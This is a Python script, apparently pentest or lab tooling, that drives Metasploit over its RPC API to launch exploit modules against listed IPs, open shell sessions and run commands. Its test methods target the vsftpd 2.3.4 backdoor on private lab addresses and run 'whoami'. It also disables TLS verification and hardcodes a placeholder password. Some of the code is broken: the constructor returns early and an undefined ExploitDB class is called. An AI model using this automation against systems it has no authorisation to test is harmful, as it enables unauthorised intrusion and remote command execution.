import subprocess
import logging
import asyncio
import requests
import uuid
import requests.packages.urllib3
import msgpack
from pymetasploit3.msfrpc import MsfRpcClient
from retry import retry

requests.packages.urllib3.disable_warnings()


logging.basicConfig(
    level=logging.DEBUG,
    format='%(levelname)s [%(asctime)s] %(filename)s:%(lineno)d - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def encode(data):
    return msgpack.packb(data)

def decode(data):
    return msgpack.unpackb(data, strict_map_key=False)

def convert(data, encoding="utf-8"):
    """
    Converts all bytestrings to utf8
    """
    if isinstance(data, bytes):  return data.decode(encoding=encoding)
    if isinstance(data, list):   return list(map(lambda iter: convert(iter, encoding=encoding), data))
    if isinstance(data, set):    return set(map(lambda iter: convert(iter, encoding=encoding), data))
    if isinstance(data, dict):   return dict(map(lambda iter: convert(iter, encoding=encoding), data.items()))
    if isinstance(data, tuple):  return map(lambda iter: convert(iter, encoding=encoding), data)
    return data

class RpcClient:
    def __init__(self, password,**kwargs) -> None:
        self.uri = kwargs.get('uri', '/api/')
        self.port = kwargs.get('port', 55553)
        self.host = kwargs.get('server', '127.0.0.1')
        self.ssl = kwargs.get('ssl', False)
        self.token = kwargs.get('token')
        self.encoding = kwargs.get('encoding', 'utf-8')
        self.headers = {"Content-type": "binary/message-pack"}
        if self.token is None:
            self.login(kwargs.get('username', 'msf'), password)

    def add_perm_token(self):
        """
        Add a permanent UUID4 API token
        """
        token = str(uuid.uuid4())
        self.call("auth.token_add", [token])
        return token
    
    def call(self, method, opts=None, is_raw=False):
        if not isinstance(opts, list):
            opts = []
        if method != 'auth.login':
            if self.token is None:
                raise Exception("MsfRPC: Not Authenticated")

        if method != "auth.login":
            opts.insert(0, self.token)

        if self.ssl is True:
            url = "https://%s:%s%s" % (self.host, self.port, self.uri)
        else:
            url = "http://%s:%s%s" % (self.host, self.port, self.uri)

        opts.insert(0, method)
        payload = encode(opts)

        r = self.post_request(url, payload)

        opts[:] = []  # Clear opts list

        if is_raw:
            return r.content

        return convert(decode(r.content), self.encoding)  # convert all keys/vals to utf8

    def login(self, user, password):
        auth = self.call('auth.login', [user, password])
        try:
            if auth['result'] == 'success':
                self.token = auth['token']
                token = self.add_perm_token()   
                self.token = token
                return True
        except Exception:
            raise Exception("MsfRPC: Authentication failed")

    @retry(tries=3, delay=1, backoff=2)
    def post_request(self, url, payload):
        return requests.post(url, data=payload, headers=self.headers, verify=False)

class Console:
    def __init__(self) -> None:
        self.rpc = RpcClient('yourpassword', ssl=True)
        data = self.get_running_stats()
        logging.debug(data)
        return
        self.client = MsfRpcClient('yourpassword', ssl=True)
        self.exploit = None
        self.shells = {}

    def get_running_stats(self):
        return self.rpc.call('module.running_stats')

    def search_module(self, module_name):
        logging.debug(f"searching for module -> {module_name}")
        return self.client.modules.search(module_name)

    def is_valid_module(self, module_name):
        modules_data = self.search_module(module_name)
        for module in modules_data:
            if module_name == module['fullname']: 
                logging.debug(f"valid module selected -> {module['fullname']}")
                return True
        logging.error(f"invalid module selected -> {module_name}")
        return False

    def set_payload(self, payload_path):
        if not self.is_valid_module(payload_path):
            logging.error("payload has not been set")
            return        
        self.exploit = self.client.modules.use('exploit', payload_path)
        
    def set_arguments(self, arguments):
        if self.exploit is None: return
        for argument in arguments.keys():
            self.exploit[argument] = arguments[argument]

    def get_session_id(self, ip):
        logging.debug(f"current sessions data -> {self.client.sessions.list}")
        for id in self.client.sessions.list.keys():
            if self.client.sessions.list[id]["session_host"] == ip:
                return id
        return None

    def is_exploited(self, target):
        sessions = self.client.sessions.list
        for session_id in sessions:
            if sessions[session_id]["target_host"] == target:
                return (True, session_id)
        return (False, None)
    
    async def run_payloads(self, targets: dict):
        """
        targets = {"ip": (payload, shell, arguments)}
        """
        result = {}
        for target in targets:
            payload, shell, arguments = targets[target]
            result[target] = {}
            if not self.is_valid_module(payload):
                result[target]["success"] = False
                result[target]["reason"] = "INVALID_MODULE"
                continue
            self.set_payload(payload)
            self.set_arguments(arguments)
            session_id = await self.run_payload(shell, target)
            result[target]["session_id"] = session_id
            logging.debug(f"payload sent for -> {target}") 
        logging.debug(f"final session data -> {self.client.sessions.list}")


    async def run_payload(self, shell_path, ip):
        if self.exploit is None: return
        is_exploited, session_id = self.is_exploited(ip)
        if is_exploited:
            logging.warning(f"target {ip} already has a session; session_id -> {session_id} ")
            return session_id

        exploit_result = self.exploit.execute(payload=shell_path)
        exploit_result["ip"] = ip
        logging.debug("job_id -> " + str(exploit_result["job_id"]))
        logging.debug(exploit_result)

        session_id = self.get_session_id(ip)

        logging.debug(f"job_id -> {exploit_result['job_id']}")
        logging.debug(f"session_id -> {session_id}")
        if exploit_result["job_id"] == None or session_id == None:
            logging.error("payload failed")
            return
        logging.debug(exploit_result)
        return session_id

    async def interact(self, session_id, command, ip):
        logging.debug("trying to interact: " + session_id)
        client = MsfRpcClient('yourpassword',ssl=True)
        session_id = session_id
        for id in client.sessions.list.keys():
            if client.sessions.list[id]["session_host"] == ip:
                session_id = id  
        shell = client.sessions.session(session_id)
        shell.write(command)
        print(shell.read())

        
    def get_sessions(self):
        return self.client.sessions.list
    
    async def exploit_test(self, ip, path):
        logging.debug("before: "+str(self.client.sessions.list))
        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
        self.set_payload(path)
        # self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":ip
        })
        #exploit_result = exploit.execute(payload='cmd/unix/interact')
        session_id = await self.run_payload('cmd/unix/interact',ip)
        if session_id is None: return
        logging.debug("after: "+str(self.client.sessions.list))
        await self.interact(session_id, "whoami",ip)
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())


    async def test(self):
        logging.debug("before: "+str(self.client.sessions.list))
        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
        self.set_payload('exploit/unix/ftp/vsftpd_234_backdoor')
        # self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":"192.168.17.130"
        })
        #exploit_result = exploit.execute(payload='cmd/unix/interact')
        session_id = await self.run_payload('cmd/unix/interact',"192.168.17.130")
        if session_id is None: return
        logging.debug("after: "+str(self.client.sessions.list))
        await self.interact(session_id, "whoami","192.168.17.130")
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())

    async def test2(self):
        targets = {
            "192.168.17.130": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.130"}),
            "192.168.17.131": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.131"}),
        }
        await self.run_payloads(targets)

async def testing():

    db = ExploitDB()
    console = Console(db=db)
    await console.test()
    # await console.start_msfconsole()
    # await console.set_payload("exploit/linux/postgres/postgres_payload")
    # await console.set_argument("tt","a")
    # await console.set_argument("rhosts", "192.168.17.130")
    # await console.set_argument("lhost","eth0")
    # await console.run_payload()

